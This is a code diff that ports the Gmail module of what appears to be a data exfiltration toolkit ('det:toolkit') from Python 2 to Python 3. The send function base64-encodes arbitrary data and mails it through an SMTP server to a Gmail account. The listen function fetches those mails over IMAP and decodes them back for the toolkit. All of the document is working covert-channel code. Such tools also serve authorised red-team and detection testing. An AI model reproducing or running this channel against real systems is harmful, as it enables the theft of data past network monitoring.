@@ -4,8 +4,8 @@ from smtplib import SMTP
 import email
 import time
 import sys
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEText import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 app_exfiltrate = None
 gmail_user = ''
@@ -15,6 +15,10 @@ server_port = 587
 
 
 def send(data):
+    encoded_data = base64.b64encode(
+        data.encode('utf-8') if isinstance(data, str) else data
+    ).decode('ascii')
+
     mail_server = SMTP()
     mail_server.connect(server, server_port)
     mail_server.starttls()
@@ -24,7 +28,7 @@ def send(data):
     msg['From'] = gmail_user
     msg['To'] = gmail_user
     msg['Subject'] = "det:toolkit"
-    msg.attach(MIMEText(base64.b64encode(data)))
+    msg.attach(MIMEText(encoded_data))
     app_exfiltrate.log_message(
         'info', "[gmail] Sending {} bytes in mail".format(len(data)))
     mail_server.sendmail(gmail_user, gmail_user, msg.as_string())
@@ -47,16 +51,14 @@ def listen():
         for msg_id in id_list[0].split():
             msg_data = client_imap.uid('fetch', msg_id, '(RFC822)')
             raw_email = msg_data[1][0][1]
-            # continue inside the same for loop as above
-            raw_email_string = raw_email.decode('utf-8')
-            # converts byte literal to string removing b''
-            email_message = email.message_from_string(raw_email_string)
+            email_message = email.message_from_bytes(raw_email)
             # this will loop through all the available multiparts in mail
             for part in email_message.walk():
                 if part.get_content_type() == "text/plain":  # ignore attachments/html
                     body = part.get_payload(decode=True)
-                    data = body.split('\r\n')[0]
-                    # print data
+                    if not body:
+                        continue
+                    data = body.splitlines()[0]
                     try:
                         app_exfiltrate.retrieve_data(base64.b64decode(data))
                     except Exception as e:
